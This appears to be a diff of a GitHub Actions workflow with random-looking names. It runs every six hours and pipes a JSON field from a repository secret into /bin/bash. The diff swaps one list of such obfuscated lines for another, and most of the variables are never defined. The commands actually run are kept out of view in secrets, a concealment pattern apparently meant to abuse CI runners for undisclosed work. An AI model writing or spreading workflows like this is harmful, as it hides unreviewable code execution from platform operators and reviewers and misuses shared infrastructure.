@@ -1,31 +1,25 @@
 name: luantanwanyu
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 5/6 * * *'
+    - cron: '40 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luantanwanyu
         env:
-          lmuon7397: ${{ secrets.lmuon7397 }}
+          e7734: ${{ secrets.e7734 }}
         run: |
-          echo $lmuon7397 | jq -r .k592 | /bin/bash
-          echo $uvce423 | jq -r .cdpq03 | /bin/bash
-          echo $rnmo9473 | jq -r .x0 | /bin/bash
-          echo $szmo58432 | jq -r .x67530 | /bin/bash
-          echo $anfxy906 | jq -r .ujs21653 | /bin/bash
-          echo $rbsy9 | jq -r .gyo027 | /bin/bash
-          echo $qhf42089 | jq -r .vrl1 | /bin/bash
-          echo $h021 | jq -r .t1 | /bin/bash
-          echo $lckcz1 | jq -r .x3682 | /bin/bash
-          echo $tpzxp24 | jq -r .nmlf37949 | /bin/bash
-          echo $oey2391 | jq -r .dcne7 | /bin/bash
-          echo $n41 | jq -r .yitj05466 | /bin/bash
-          echo $tjwa4 | jq -r .h5 | /bin/bash
-          echo $pbq92958 | jq -r .houmx043 | /bin/bash
+          echo $e7734 | jq -r .kxirf95831 | /bin/bash
+          echo $i55 | jq -r .jlp91080 | /bin/bash
+          echo $fbc28 | jq -r .n65 | /bin/bash
+          echo $uc2733 | jq -r .xga8033 | /bin/bash
+          echo $evlr4 | jq -r .gdpzo5735 | /bin/bash
+          echo $tiruc99676 | jq -r .vmftw27 | /bin/bash
+          echo $kgie830 | jq -r .oxioa423 | /bin/bash
+          echo $foavd4 | jq -r .ly9119 | /bin/bash
+          echo $sgcz21335 | jq -r .aj3 | /bin/bash
 
